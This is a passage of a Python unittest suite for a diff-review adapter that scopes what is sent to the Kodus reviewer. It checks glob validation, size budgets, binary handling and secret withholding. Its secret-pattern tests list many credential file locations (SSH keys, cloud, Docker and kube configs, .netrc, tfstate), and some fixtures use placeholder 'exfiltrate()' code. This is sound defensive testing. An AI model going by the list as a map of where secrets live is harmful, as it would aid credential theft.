        manifest=json.loads(Path(candidate['manifest_path']).read_bytes())
        self.assertEqual([f['path'] for f in manifest],['a.py','vendor/lib/changed.js'])
        base_manifest=json.loads(Path(candidate['base_manifest_path']).read_bytes())
        self.assertEqual(hashlib.sha256(Path(candidate['base_manifest_path']).read_bytes()).hexdigest(),
                         candidate['base_manifest_sha256'])
        self.assertEqual([f['path'] for f in base_manifest],['a.py','vendor/lib/changed.js'])
        # An unchanged ignored sibling never becomes same-directory context.
        self.assertEqual([m['path'] for m in self.scope_record(e)['materialised']],['a.py','vendor/lib/changed.js'])

    def test_ignored_changed_paths_outside_raw_grammar_are_recorded_not_refused(self):
        folder=self.repo/'generated';folder.mkdir()
        for name in ('unicode-é.md','quote".md','trailing '):
            (folder/name).write_text('generated '+name+'\n')
        (self.repo/'a.py').write_text('value = 6\n')
        self.ignores=self.write_ignores(['generated/**'])
        run,e=self.run_review()
        self.assertEqual(run.returncode,0,run.stderr)
        candidate=e['candidate']
        self.assertEqual(self.kodus_paths(),['a.py'])
        expected=sorted(['generated/unicode-é.md','generated/quote".md','generated/trailing '])
        self.assertEqual(sorted(candidate['ignored_paths']),expected)
        self.assertEqual(sorted(candidate['unsent_paths_outside_grammar']),expected)
        full=Path(candidate['patch_path']).read_bytes()
        self.assertEqual(full.count(b'diff --git '),4)
        for name in expected:
            self.assertTrue((Path(candidate['snapshot_path'])/name).exists())
        # A changed ignored path the local snapshot cannot represent still refuses: it would
        # otherwise be hidden from the independent reviewer.
        calls=len(self.calls);(folder/'tab\tname.md').write_text('control\n')
        run,e=self.run_review();self.assertEqual(run.returncode,2,run.stderr)
        self.assertEqual(len(self.calls),calls)
        self.assertEqual(e['kodus']['error'],'Unsupported candidate path')

    def test_patterns_that_match_everything_or_escape_plain_glob_refuse(self):
        (self.repo/'a.py').write_text('import os\n')
        bad=['{a,b}.py','a}.py','!(x).py','@(x).py','+(x).py','?(x).py','*(x).py','./a.py',
             'a//b','src/./x','dist/','.','*','**','***','**/*','**/?*','*/*','?','?*/**']
        for pattern in bad:
            with self.subTest(pattern=pattern):
                self.ignores=self.write_ignores([pattern])
                run,e=self.run_review();self.assertEqual(run.returncode,2,run.stderr)
                self.assertEqual(self.calls,[]);self.assertEqual(e['kodus']['verdict'],'NO_VERDICT')
        with self.subTest(case='duplicate'):
            self.ignores=self.write_ignores(['**/*.lock','**/*.lock'])
            run,e=self.run_review();self.assertEqual(run.returncode,2,run.stderr)
        # A hand-written catch-all must not turn a real change into a Kodus skip.
        with self.subTest(case='hand-written catch-all'):
            self.ignores=self.write_ignores(['**'],source='any/thing',commit='0'*40)
            run,e=self.run_review({'KODUS_REVIEW_TOKEN_FILE':str(self.root/'absent')})
            self.assertEqual(run.returncode,2,run.stderr)
            self.assertNotEqual(e['kodus']['verdict'],'SKIPPED')
        self.assertEqual(self.calls,[])
        for pattern in ('**/dist/**','*.gen.go','a?c/**','**/x*/**'):
            with self.subTest(accepted=pattern):
                self.ignores=self.write_ignores([pattern]);calls=len(self.calls)
                run,e=self.run_review();self.assertEqual(run.returncode,0,run.stderr)
                self.assertGreater(len(self.calls),calls)

    def test_deleted_ignored_path_stays_in_full_patch_and_base_snapshot(self):
        (self.repo/'gen').mkdir();(self.repo/'gen/old.lock').write_text('locked\n')
        self.commit('lock','gen/old.lock')
        (self.repo/'gen/old.lock').unlink();(self.repo/'a.py').write_text('value = 11\n')
        run,e=self.run_review();self.assertEqual(run.returncode,0,run.stderr)
        candidate=e['candidate']
        self.assertEqual(candidate['ignored_paths'],['gen/old.lock'])
        self.assertEqual(self.kodus_paths(),['a.py'])
        self.assertIn(b'deleted file mode',Path(candidate['patch_path']).read_bytes())
        self.assertEqual((Path(candidate['base_snapshot_path'])/'gen/old.lock').read_text(),'locked\n')
        self.assertFalse((Path(candidate['snapshot_path'])/'gen/old.lock').exists())

    def test_file_to_directory_with_ignored_child_sends_only_the_file_side(self):
        (self.repo/'foo').write_text('was a file\n');self.commit('file','foo')
        head_file=self.base
        (self.repo/'foo').unlink();(self.repo/'foo').mkdir();(self.repo/'foo/bar.lock').write_text('child\n')
        self.git('add','--all','--','foo');self.git('-c','commit.gpgsign=false','commit','-qm','dir')
        head=self.git('rev-parse','HEAD').strip();self.base=head_file
        run,e=self.run_review({},'--head',head);self.assertEqual(run.returncode,0,run.stderr)
        candidate=e['candidate']
        self.assertEqual(candidate['submitted_paths'],['foo']);self.assertEqual(candidate['ignored_paths'],['foo/bar.lock'])
        files=self.sent_files(0)
        self.assertEqual([(f['path'],f['status']) for f in files],[('foo','deleted')])
        self.assertNotIn('bar.lock',self.calls[0][2]['diff'])
        self.assertEqual(Path(candidate['patch_path']).read_bytes().count(b'diff --git '),2)
        self.assertEqual((Path(candidate['snapshot_path'])/'foo/bar.lock').read_text(),'child\n')
        self.assertEqual((Path(candidate['base_snapshot_path'])/'foo').read_text(),'was a file\n')

    def test_changed_ignored_symlink_is_refused_not_hidden(self):
        (self.repo/'a.py').write_text('value = 12\n')
        (self.repo/'vendor').mkdir();(self.repo/'vendor/link').symlink_to('../a.py')
        self.ignores=self.write_ignores(['**/vendor/**'])
        run,e=self.run_review();self.assertEqual(run.returncode,2,run.stderr)
        self.assertEqual(self.calls,[])
        self.assertIn('Symlinks',e['kodus']['error'])

    def test_renderer_binds_the_ignores_document_byte_for_byte(self):
        (self.repo/'a.py').write_text('value = 21\n')
        renderer,log=self.write_renderer(self.ignores.read_bytes())
        run,e=self.run_review({'KODUS_REVIEW_IGNORES_RENDERER':str(renderer)})
        self.assertEqual(run.returncode,0,run.stderr)
        self.assertTrue(e['candidate']['ignores_renderer_verified'])
        self.assertEqual(log.read_text().splitlines(),['--repo','example/project','--commit','a'*40])
        calls=len(self.calls)
        for label,(output,code,sleep) in {'mismatch':(self.ignores.read_bytes()+b' ',0,0),
                                          'empty':(b'',0,0),
                                          'failure':(self.ignores.read_bytes(),3,0),
                                          'oversized':(b'x'*(1024*1024+1),0,0)}.items():
            with self.subTest(case=label):
                renderer,_=self.write_renderer(output,code,sleep)
                run,e=self.run_review({'KODUS_REVIEW_IGNORES_RENDERER':str(renderer)})
                self.assertEqual(run.returncode,2,run.stderr)
                self.assertEqual(e['kodus']['verdict'],'NO_VERDICT');self.assertIsNone(e['candidate'])
        with self.subTest(case='timeout'):
            renderer,_=self.write_renderer(self.ignores.read_bytes(),0,5)
            run,e=self.run_review({'KODUS_REVIEW_IGNORES_RENDERER':str(renderer)},patched={'RENDER_TIMEOUT':0.5})
            self.assertEqual(run.returncode,2,run.stderr);self.assertIn('timed out',e['kodus']['error'])
        good,_=self.write_renderer(self.ignores.read_bytes())
        plain=self.root/'not-executable';plain.write_bytes(good.read_bytes());plain.chmod(0o644)
        for label,value in (('relative','renderer-0'),('not-executable',str(plain)),
                            ('directory',str(self.root)),('absent',str(self.root/'absent'))):
            with self.subTest(case=label):
                run,e=self.run_review({'KODUS_REVIEW_IGNORES_RENDERER':value})
                self.assertEqual(run.returncode,2,run.stderr)
        self.assertEqual(len(self.calls),calls)

    def test_unbound_ignores_refuse_outside_the_synthetic_fixture(self):
        (self.repo/'a.py').write_text('value = 22\n')
        production=self.root/'production-token';production.write_text('kodus_live_key')
        for label,changes in (('https origin',{'KODUS_REVIEW_API_URL':'https://kodus.example.invalid'}),
                              ('non-test key',{'KODUS_REVIEW_TOKEN_FILE':str(production)}),
                              ('no token',{'KODUS_REVIEW_TOKEN_FILE':str(self.root/'absent')})):
            with self.subTest(case=label):
                run,e=self.run_review(changes)
                self.assertEqual(run.returncode,2,run.stderr)
                self.assertIn('KODUS_REVIEW_IGNORES_RENDERER is required',e['kodus']['error'])
        self.assertEqual(self.calls,[])
        run,e=self.run_review();self.assertEqual(run.returncode,0,run.stderr)
        self.assertFalse(e['candidate']['ignores_renderer_verified'])

    def test_hand_written_broad_document_cannot_pass_a_real_renderer(self):
        (self.repo/'a.py').write_text('import os\n')
        real=self.write_ignores(['**/*.lock'])
        renderer,_=self.write_renderer(real.read_bytes())
        self.ignores=self.write_ignores(['**/*.py'])
        run,e=self.run_review({'KODUS_REVIEW_IGNORES_RENDERER':str(renderer),
                               'KODUS_REVIEW_TOKEN_FILE':str(self.root/'absent')})
        self.assertEqual(run.returncode,2,run.stderr)
        self.assertEqual(e['kodus']['verdict'],'NO_VERDICT')
        self.assertIn('differs from the pinned central render',e['kodus']['error'])
        self.assertEqual(self.calls,[])

    def test_full_candidate_patch_is_streamed_capped_and_hashed_from_disk(self):
        (self.repo/'gen').mkdir()
        (self.repo/'gen/big.lock').write_text('row\n'*2000);(self.repo/'a.py').write_text('value = 23\n')
        run,e=self.run_review(patched={'MAX_FULL_PATCH_BYTES':4000})
        self.assertEqual(run.returncode,2,run.stderr)
        self.assertEqual(e['kodus']['error'],'Oversized full candidate patch is unsupported')
        self.assertEqual(self.calls,[])
        run,e=self.run_review(patched={'MAX_FULL_PATCH_BYTES':64*1024})
        self.assertEqual(run.returncode,0,run.stderr)
        stored=Path(e['candidate']['patch_path'])
        self.assertEqual(hashlib.sha256(stored.read_bytes()).hexdigest(),e['candidate']['patch_sha256'])
        self.assertEqual(e['candidate']['candidate_patch_bytes'],stored.stat().st_size)
        self.assertEqual(stored.stat().st_mode & 0o777,0o444)
        for error in ('MemoryError','OSError'):
            with self.subTest(error=error):
                run,e=self.run_review(raises={'scan_patch':error})
                self.assertEqual(run.returncode,2,run.stderr)
                self.assertNotIn('Traceback',run.stderr)
                self.assertEqual(e['kodus']['verdict'],'NO_VERDICT');self.assertIn('error',e['kodus'])

    # ---- Composed scope model: context, content, secret and binary handling under the
    # ---- kodus-review-ignores/2 document.

    def test_default_scope_materialises_changed_files_and_selected_context_only(self):
        self.write('pkg/a.go','package pkg\n\nfunc A() int { return 1 }\n')
        self.write('pkg/b.go','package pkg\n\nfunc B() int { return A() }\n')
        self.write('pkg/z_generated.go','// Code generated by tool. DO NOT EDIT.\npackage pkg\n')
        self.write('other/c.go','package other\n')
        self.write('pkg/node_modules/dep/index.js','module.exports = 1\n')
        self.write('AGENTS.md','contract\n')
        self.commit_all('layout')
        self.write('pkg/a.go','package pkg\n\nfunc A() int { return 2 }\n')
        self.ignores=self.write_ignores(['**/node_modules/**'])
        run,e=self.run_review()
        self.assertEqual(run.returncode,0,run.stderr)
        candidate=e['candidate'];scope=self.scope_record(e)
        self.assertEqual(e['schema_version'],2)
        snapshot=Path(candidate['snapshot_path']);base=Path(candidate['base_snapshot_path'])
        listed=sorted(str(p.relative_to(snapshot)) for p in snapshot.rglob('*') if p.is_file())
        self.assertEqual(listed,['AGENTS.md','pkg/a.go','pkg/b.go'])
        self.assertEqual((base/'pkg/a.go').read_text(),'package pkg\n\nfunc A() int { return 1 }\n')
        self.assertEqual([(m['path'],m['reason']) for m in scope['materialised']],
                         [('pkg/a.go','changed'),('AGENTS.md','include'),('pkg/b.go','same-directory')])
        self.assertEqual(scope['excluded_context_files'],1)
        self.assertEqual(self.git('cat-file','-t',candidate['tree']).strip(),'tree')
        files=self.sent_files(0)
        self.assertEqual(files[0]['content'],'package pkg\n\nfunc A() int { return 2 }\n')
        self.assertEqual([c['path'] for c in scope['kodus']['content']],['pkg/a.go'])
        self.assertEqual(e['kodus']['request_sha256'],hashlib.sha256(
            (json.dumps(self.calls[0][2],sort_keys=True,ensure_ascii=True,indent=2)+'\n').encode()).hexdigest())
        self.assertEqual(candidate['dispositions'],[{'path':'pkg/a.go','status':'modified','disposition':'sent'}])

    def test_out_of_scope_bulk_does_not_block_a_small_candidate(self):
        self.write('db/huge.sql.gz',os.urandom(40*1024*1024))
        self.write('db/sibling.sql','select 1;\n');self.write('db/a.sql','select 0;\n')
        self.commit_all('bulk')
        self.write('db/a.sql','select 5;\n')
        self.ignores=self.write_ignores(['db/*.sql.gz'])
        run,e=self.run_review()
        self.assertEqual(run.returncode,0,run.stderr)
        record=self.scope_record(e)
        self.assertEqual([m['path'] for m in record['materialised']],['db/a.sql','db/sibling.sql'])
        self.assertEqual(record['excluded_context_files'],1)
        self.assertGreater(record['tree']['bytes'],40*1024*1024)

    def test_changed_files_over_budget_have_no_verdict_and_send_nothing(self):
        self.write('a.py','x = 1\n'*2000)
        self.ignores=self.write_ignores([],snapshot_budget_bytes=4096)
        run,e=self.run_review()
        self.assertEqual(run.returncode,2,run.stderr)
        self.assertIn('budget',e['kodus']['error'])
        self.assertEqual(self.calls,[])

    def test_context_truncation_is_an_ordered_recorded_prefix(self):
        self.write('AGENTS.md','contract\n')
        for name in ('b.py','c.py','d.py'):
            self.write(name,name[0]*400+'\n')
        self.write('large.py','L'*5000+'\n')
        self.commit_all('siblings')
        self.write('a.py','value = 6\n')
        self.ignores=self.write_ignores([],snapshot_budget_bytes=1400,max_context_file_bytes=4096)
        run,e=self.run_review()
        self.assertEqual(run.returncode,0,run.stderr)
        record=self.scope_record(e)
        self.assertEqual([(m['path'],m['reason']) for m in record['materialised']],
                         [('a.py','changed'),('AGENTS.md','include'),('b.py','same-directory')])
        self.assertEqual([(o['path'],o['reason']) for o in record['omitted']],
                         [('c.py','budget'),('d.py','budget'),('large.py','file-size')])
        self.assertEqual(record['budget']['snapshot_bytes_used'],840)

    def test_generated_markers_withhold_content_not_the_diff(self):
        self.write('.gitattributes','gen/** linguist-generated\nlib/blob.dat binary\nlib/vendored.js linguist-vendored\n')
        self.write('gen/schema.json','{"generated": true}\n')
        self.write('lib/vendored.js','v\n');self.write('lib/blob.dat','b\n');self.write('lib/plain.js','p\n')
        self.write('lib/gen.go','// Code generated by tool. DO NOT EDIT.\npackage lib\n')
        self.commit_all('markers')
        self.write('gen/schema.json','{"generated": false}\n')
        self.write('lib/gen.go','// Code generated by tool. DO NOT EDIT.\npackage lib\n\nvar G = 1\n')
        self.response['filesAnalyzed']=2
        run,e=self.run_review()
        self.assertEqual(run.returncode,0,run.stderr)
        record=self.scope_record(e)
        self.assertEqual({d['path']:d['disposition'] for d in e['candidate']['dispositions']},
                         {'gen/schema.json':'sent','lib/gen.go':'sent'})
        self.assertEqual(record['kodus']['content_withheld'],[{'path':'gen/schema.json','reason':'generated'},
                                                              {'path':'lib/gen.go','reason':'generated'}])
        files={f['path']:f for f in self.sent_files(0)}
        self.assertIn('"generated": false',files['gen/schema.json']['diff'])
        self.assertEqual([m['path'] for m in record['materialised'] if m['reason']!='changed'],['lib/plain.js'])
        self.assertEqual(record['excluded_context_files'],2)

    def test_kodus_content_budget_withholds_content_but_never_the_diff(self):
        self.write('a.py','A'*600+'\n');self.write('b.py','B'*600+'\n')
        self.response['filesAnalyzed']=2
        self.ignores=self.write_ignores([],kodus_content_bytes=1000)
        run,e=self.run_review()
        self.assertEqual(run.returncode,0,run.stderr)
        files=self.sent_files(0)
        self.assertEqual(len(files[0]['content']),601);self.assertEqual(files[1]['content'],'')
        self.assertIn('BBBB',files[1]['diff'])
        self.assertEqual(self.scope_record(e)['kodus']['content_withheld'],[{'path':'b.py','reason':'budget'}])
        self.ignores=self.write_ignores([],send_changed_content=False)
        run,e=self.run_review();self.assertEqual(run.returncode,0,run.stderr)
        self.assertEqual([f['content'] for f in self.sent_files(-2)],['',''])

    def test_binary_changed_files_are_withheld_and_text_parts_reviewed(self):
        binary=b'\x89PNG\x00\xfffixture'
        self.write('image.bin',binary);self.commit_all('asset')
        self.write('image.bin',binary+b'changed');self.write('blob.gz',b'\x1f\x8b\x00\x00gz')
        self.write('a.py','value = 7\n')
        run,e=self.run_review()
        self.assertEqual(run.returncode,0,run.stderr)
        body=self.calls[0][2]
        self.assertEqual(self.kodus_paths(0),['a.py'])
        self.assertNotIn('GIT binary patch',body['diff']);self.assertNotIn('image.bin',body['diff'])
        record=self.scope_record(e)
        self.assertEqual([(w['path'],w['reason'],w['status']) for w in record['kodus']['withheld_files']],
                         [('blob.gz','binary','added'),('image.bin','binary','modified')])
        self.assertEqual((Path(e['candidate']['snapshot_path'])/'image.bin').read_bytes(),binary+b'changed')
        full=Path(e['candidate']['patch_path']).read_bytes()
        self.assertIn(b'GIT binary patch',full)
        self.assertEqual(e['candidate']['submitted_patch_sha256'],hashlib.sha256(body['diff'].encode()).hexdigest())
        self.assertEqual({d['path']:d['disposition'] for d in e['candidate']['dispositions']},
                         {'a.py':'sent','blob.gz':'binary','image.bin':'binary'})

    def test_secret_patterns_withhold_changed_files_and_context_entirely(self):
        self.write('.env','TOKEN=base-value\n');self.write('app/secrets.yml','KEY: base\n')
        self.write('id_rsa','PRIVATE KEY base\n');self.write('app/main.py','x = 1\n')
        self.write('deploy/credentials/token.txt','old-token\n')
        self.commit_all('secrets')
        self.write('.env','TOKEN=leaked-value\n');self.write('app/secrets.yml','KEY: leaked\n')
        self.write('deploy/prod.tfvars','password = "leaked"\n');self.write('certs/site.pem','leaked pem\n')
        self.write('deploy/credentials/token.txt','leaked-token\n')
        self.write('a.py','value = 4\n');self.write('app/main.py','x = 2\n')
        self.response['filesAnalyzed']=2
        run,e=self.run_review()
        self.assertEqual(run.returncode,0,run.stderr)
        body=json.dumps(self.calls[0][2])
        self.assertNotIn('leaked',body);self.assertNotIn('base-value',body);self.assertNotIn('PRIVATE KEY',body)
        self.assertEqual([f['path'] for f in self.sent_files(0)],['a.py','app/main.py'])
        withheld={w['path']:w['reason'] for w in self.scope_record(e)['kodus']['withheld_files']}
        self.assertEqual(withheld,{p:'secret-pattern' for p in ('.env','app/secrets.yml','certs/site.pem',
                                                                 'deploy/credentials/token.txt','deploy/prod.tfvars')})
        snapshot=Path(e['candidate']['snapshot_path']);base=Path(e['candidate']['base_snapshot_path'])
        copied=sorted({str(p.relative_to(root)) for root in (snapshot,base) for p in root.rglob('*') if p.is_file()})
        self.assertEqual(copied,['a.py','app/main.py'])
        # The full local patch is the only local carrier of secret diffs; it is never sent.
        self.assertIn(b'leaked-value',Path(e['candidate']['patch_path']).read_bytes())

    def test_secret_patterns_match_secret_files_not_source_named_after_secrets(self):
        names=('internal/auth/secret_reveal.go','config/app-secret.json','deploy/secrets/x.yaml',
               'conf/db-secret.ini','conf/secrets.toml')
        for name in names:
            self.write(name,'base '+name+'\n')
        self.commit_all('secret-shaped names')
        for name in names:
            self.write(name,'changed-value '+name+'\n')
        run,e=self.run_review()
        self.assertEqual(run.returncode,0,run.stderr)
        self.assertEqual([f['path'] for f in self.sent_files(0)],['internal/auth/secret_reveal.go'])
        self.assertEqual(sorted(w['path'] for w in self.scope_record(e)['kodus']['withheld_files']),
                         ['conf/db-secret.ini','conf/secrets.toml','config/app-secret.json','deploy/secrets/x.yaml'])

    def test_secret_patterns_ignore_case_and_cover_credential_files(self):
        names=('.ENV','Secrets/token.txt','conf/ID_RSA','my key.PEM','.aws/credentials','.git-credentials',
               '.netrc','.npmrc','.pypirc','prod.env','secrets','id_ecdsa','keys/app.ppk','keys/app.jks',
               'keys/app.keystore',
               # Added by the compose review: secret FILE shapes only.
               'gcp/credentials.json','iam/service-account-prod.json','infra/prod.tfstate',
               'infra/prod.tfstate.backup','.pgpass','ops/kubeconfig','home/.kube/config',
               'home/.docker/config.json','web/.htpasswd','keys/release.asc','vault.kdbx','gpg/secring.gpg',
               'keys/AuthKey_ABC123.p8','.envrc','.terraformrc','tf/terraform.rc','deploy/prod.age')
        for name in names:
            self.write(name,'leaked-'+name+'\n')
        self.write('a.py','value = 4\n')
        run,e=self.run_review()
        self.assertEqual(run.returncode,0,run.stderr)
        self.assertNotIn('leaked',json.dumps(self.calls[0][2]))
        self.assertEqual([f['path'] for f in self.sent_files(0)],['a.py'])
        withheld={w['path']:w['reason'] for w in self.scope_record(e)['kodus']['withheld_files']}
        self.assertEqual(withheld,{n:'secret-pattern' for n in names})

    def test_secret_copy_of_unchanged_secret_and_rename_with_edit_are_withheld(self):
        self.write('.env','TOKEN=very-secret-value-0123456789\nOTHER=more-secret-material\n')
        self.write('old.txt','TOKEN=very-secret-value-0123456789\nOTHER=more-secret-material\n')
        self.commit_all('env')
        # cp .env config/app.txt: .env itself is unchanged.
        self.write('config/app.txt',(self.repo/'.env').read_text())
        # A base-side copy that is edited still shows secret lines as removed diff lines.
        self.write('old.txt','rewritten entirely\n')
        self.write('a.py','value = 4\n')
        run,e=self.run_review()
        self.assertEqual(run.returncode,0,run.stderr)
        self.assertNotIn('very-secret',json.dumps(self.calls[0][2]))
        self.assertEqual({d['path']:d['disposition'] for d in e['candidate']['dispositions']},
                         {'a.py':'sent','config/app.txt':'secret-copy','old.txt':'secret-copy'})
        snapshot=Path(e['candidate']['snapshot_path'])
        self.assertFalse((snapshot/'config/app.txt').exists());self.assertFalse((snapshot/'.env').exists())
        # Rename with an edit: .env -> app.conf plus one line. The blob changes, so the rule is
        # Git copy detection against every secret blob in either full tree.
        self.commit_all('copies')
        (self.repo/'.env').rename(self.repo/'app.conf')
        with (self.repo/'app.conf').open('a') as handle: handle.write('ADDED=1\n')
        self.write('a.py','value = 5\n')
        run,e=self.run_review()
        self.assertEqual(run.returncode,0,run.stderr)
        self.assertNotIn('very-secret',json.dumps(self.calls[-2][2]))
        self.assertEqual({d['path']:d['disposition'] for d in e['candidate']['dispositions']},
                         {'.env':'secret-pattern','a.py':'sent','app.conf':'secret-copy'})
        # An unchanged secret copy is never same-directory context either.
        self.assertNotIn('config/app.txt',[m['path'] for m in self.scope_record(e)['materialised']])

    def test_mode_only_change_of_a_secret_is_withheld(self):
        self.write('.ENV','TOKEN=mode-only-secret\n');self.commit_all('env')
        (self.repo/'.ENV').chmod(0o755);self.write('a.py','value = 4\n')
        run,e=self.run_review()
        self.assertEqual(run.returncode,0,run.stderr)
        self.assertNotIn('mode-only-secret',json.dumps(self.calls[0][2]))
        self.assertEqual(self.kodus_paths(),['a.py'])
        self.assertEqual({d['path']:d['disposition'] for d in e['candidate']['dispositions']},
                         {'.ENV':'secret-pattern','a.py':'sent'})

    def test_secret_list_is_add_only_and_cannot_be_switched_off(self):
        self.write('.env','A=1\n');self.commit_all('env')
        self.write('.env','A=2\n');self.write('a.py','value = 4\n');self.write('conf/x.vault','vaulted\n')
        # The failed review's probe: an empty replacement list switched withholding off.
        for label,document in (('secret_exclude empty',dict(secret_exclude=[])),
                               ('secret_exclude replace',dict(secret_exclude=['nothing/**'])),
                               ('inherit_default',dict(inherit_default=False))):
            with self.subTest(case=label):
                self.ignores=self.write_ignores([],**document)
                run,e=self.run_review();self.assertEqual(run.returncode,2,run.stderr)
                self.assertIn('rendered key set',e['kodus']['error'])
        self.assertEqual(self.calls,[])
        self.ignores=self.write_ignores(['**/.env'],secret_add=['**/*.vault'])
        run,e=self.run_review();self.assertEqual(run.returncode,0,run.stderr)
        self.assertEqual([f['path'] for f in self.sent_files(0)],['a.py'])
        self.assertEqual({d['path']:d['disposition'] for d in e['candidate']['dispositions']},
                         {'.env':'secret-pattern','a.py':'sent','conf/x.vault':'secret-pattern'})
        self.assertIn('**/.env',self.scope_record(e)['effective']['secret_patterns'])

    def test_precedence_skip_and_no_verdict_follow_the_ignores(self):
        # Every changed path ignored (a secret among them): SKIPPED, no request, no token.
        self.write('.env','A=1\n');self.write('gen/x.lock','l\n')
        self.ignores=self.write_ignores(['**/.env','**/*.lock'])
        renderer,_=self.write_renderer(self.ignores.read_bytes())
        run,e=self.run_review({'KODUS_REVIEW_TOKEN_FILE':str(self.root/'absent'),
                               'KODUS_REVIEW_IGNORES_RENDERER':str(renderer)})
        self.assertEqual(run.returncode,0,run.stderr)
        self.assertEqual(e['kodus']['verdict'],'SKIPPED');self.assertEqual(self.calls,[])
        self.assertEqual({d['path']:d['disposition'] for d in e['candidate']['dispositions']},
                         {'.env':'secret-pattern','gen/x.lock':'ignored'})
        self.assertFalse((Path(e['candidate']['snapshot_path'])/'.env').exists())
        self.assertTrue((Path(e['candidate']['snapshot_path'])/'gen/x.lock').exists())
        # Outside the ignores only binary or secret remains: NO_VERDICT, never SKIPPED.
        self.write('img.bin',b'\x00\x01binary');self.write('prod.pem','k\n')
        run,e=self.run_review({'KODUS_REVIEW_TOKEN_FILE':str(self.root/'absent'),
                               'KODUS_REVIEW_IGNORES_RENDERER':str(renderer)})
        self.assertEqual(run.returncode,2,run.stderr)
        self.assertIn('No reviewable text changes',e['kodus']['error'])
        self.assertEqual(self.calls,[])
        # Each changed path has exactly one disposition, in changed-path order.
        self.write('a.py','value = 9\n')
        run,e=self.run_review();self.assertEqual(run.returncode,0,run.stderr)
        candidate=e['candidate']
        self.assertEqual([d['path'] for d in candidate['dispositions']],candidate['changed_paths'])
        self.assertEqual([d['disposition'] for d in candidate['dispositions']],
                         ['secret-pattern','sent','ignored','binary','secret-pattern'])
        self.assertEqual(candidate['submitted_paths'],['a.py'])
        self.assertEqual(candidate['withheld_paths'],['.env','img.bin','prod.pem'])

    def test_character_class_patterns_are_refused(self):
        self.write('a.py','value = 4\n')
        for label,changes in (('patterns',dict(patterns=['[a-z]*/**'])),('dotclass',dict(patterns=['[.]*/**'])),
                              ('ext',dict(patterns=['[A-Za-z]*.*'])),('include',dict(context_include=['[a]*.md'])),
                              ('secret',dict(secret_add=['x]/**']))):
            with self.subTest(case=label):
                self.ignores=self.write_ignores(**{'patterns':[],**changes})
                run,e=self.run_review();self.assertEqual(run.returncode,2,run.stderr)
                self.assertIn('glob grammar',e['kodus']['error'])
        self.assertEqual(self.calls,[])

    def test_scope_values_are_validated_before_submission(self):
        self.write('a.py','value = 3\n')
        for label,changes in (('ceiling',dict(snapshot_budget_bytes=48*1024*1024+1)),
                              ('zero',dict(kodus_content_bytes=0)),('bool int',dict(max_context_file_bytes=True)),
                              ('flag',dict(same_directory='yes')),('include not list',dict(context_include='AGENTS.md')),
                              ('include dup',dict(context_include=['a.md','a.md']))):
            with self.subTest(case=label):
                self.ignores=self.write_ignores([],**changes)
                run,e=self.run_review();self.assertEqual(run.returncode,2,run.stderr)
                self.assertEqual(e['kodus']['verdict'],'NO_VERDICT')
        self.assertEqual(self.calls,[])

    def test_parse_errors_and_unexpected_failures_are_no_verdict_never_exit_1(self):
        self.write('a.py','value = 3\n')
        self.ignores=self.write_ignores([],raw=b'['*100000+b']'*100000)
        run,e=self.run_review()
        self.assertEqual(run.returncode,2,run.stderr);self.assertNotIn('Traceback',run.stderr)
        self.assertEqual(e['kodus']['verdict'],'NO_VERDICT')
        self.ignores=self.write_ignores([])
        run,e=self.run_review(raises={'secret_copies':'KeyError'})
        self.assertEqual(run.returncode,2,run.stderr);self.assertNotIn('Traceback',run.stderr)
        self.assertEqual(e['kodus']['error'],'Unexpected adapter failure')
        self.assertEqual(self.calls,[])

    def test_git_below_2_40_is_refused_before_submission(self):
        fake=self.root/'old-git';real=subprocess.check_output(['sh','-c','command -v git'],text=True).strip()
        fake.write_text('#!/bin/sh\nif [ "$1" = "--version" ]; then echo "git version 2.39.5 (Apple Git-154)"; exit 0; fi\n'
                        'exec '+real+' "$@"\n');fake.chmod(0o755)
        self.write('a.py','value = 4\n')
        run,e=self.run_review({'KODUS_REVIEW_GIT':str(fake)})
        self.assertEqual(run.returncode,2,run.stderr)
        self.assertIn('2.40',e['kodus']['error'])
        self.assertEqual(self.calls,[])
        run,e=self.run_review({'KODUS_REVIEW_GIT':'git-relative'})
        self.assertEqual(run.returncode,2,run.stderr)
        self.assertIn('absolute',e['kodus']['error'])
        self.assertEqual(self.calls,[])

    def test_skill_binds_the_verdict_to_what_kodus_received(self):
        skill=(PLUGIN/'skills/kodus-review/SKILL.md').read_text()
        readme=(PLUGIN/'tools/kodus-review/README.md').read_text()
        for name in ('submitted.patch','submitted_patch_sha256','submitted_paths','dispositions'):
            self.assertIn(name,skill)
        for text in (skill,readme):
            self.assertIn('never sent to Kodus',text)
            self.assertNotIn('--scope',text)

    def test_caller_attributes_and_git_config_never_change_a_disposition(self):
        self.write('main.go','package main\nfunc ok(){}\n');self.commit_all('go')
        self.write('main.go','package main\nfunc ok(){ exfiltrate() }\n')
        info=self.repo/'.git/info';info.mkdir(exist_ok=True)
        attrs=self.root/'attrs';attrs.write_text('main.go -diff\n')
        for label,setup,undo in (
                ('info/attributes binary',lambda:(info/'attributes').write_text('*.go binary\n'),
                 lambda:(info/'attributes').unlink()),
                ('bigFileThreshold',lambda:self.git('config','core.bigFileThreshold','20'),
                 lambda:self.git('config','--unset','core.bigFileThreshold')),
                ('attributesFile -diff',lambda:self.git('config','core.attributesFile',str(attrs)),
                 lambda:self.git('config','--unset','core.attributesFile')),
                ('textconv driver',lambda:((info/'attributes').write_text('*.go diff=hex\n'),
                                           self.git('config','diff.hex.textconv','od -c')),
                 lambda:((info/'attributes').unlink(),self.git('config','--unset','diff.hex.textconv'))),
                ('info/attributes generated',lambda:(info/'attributes').write_text('main.go linguist-generated\n'),
                 lambda:(info/'attributes').unlink())):
            with self.subTest(case=label):
                setup();calls=len(self.calls)
                run,e=self.run_review();undo()
                self.assertEqual(run.returncode,0,run.stderr)
                self.assertEqual(e['candidate']['dispositions'],[{'path':'main.go','status':'modified','disposition':'sent'}])
                body=self.calls[calls][2]
                self.assertIn('+func ok(){ exfiltrate() }',body['diff'])
                self.assertNotIn('Binary files',body['diff']);self.assertNotIn('0000000',body['diff'])
                self.assertEqual(body['config']['files'][0]['content'],'package main\nfunc ok(){ exfiltrate() }\n')

    def test_committed_binary_attribute_on_a_text_file_still_sends_it(self):
        self.write('.gitattributes','main.go binary\n');self.write('main.go','package main\n');self.commit_all('attrs')
        self.write('main.go','package main\nfunc evil(){}\n')
        run,e=self.run_review()
        self.assertEqual(run.returncode,0,run.stderr)
        self.assertEqual(e['candidate']['submitted_paths'],['main.go'])
        self.assertIn('+func evil(){}',self.calls[0][2]['diff'])

    def test_repository_ignorecase_cannot_widen_an_ignore_pattern(self):
        self.write('docs/history/a.md','x\n');self.commit_all('docs')
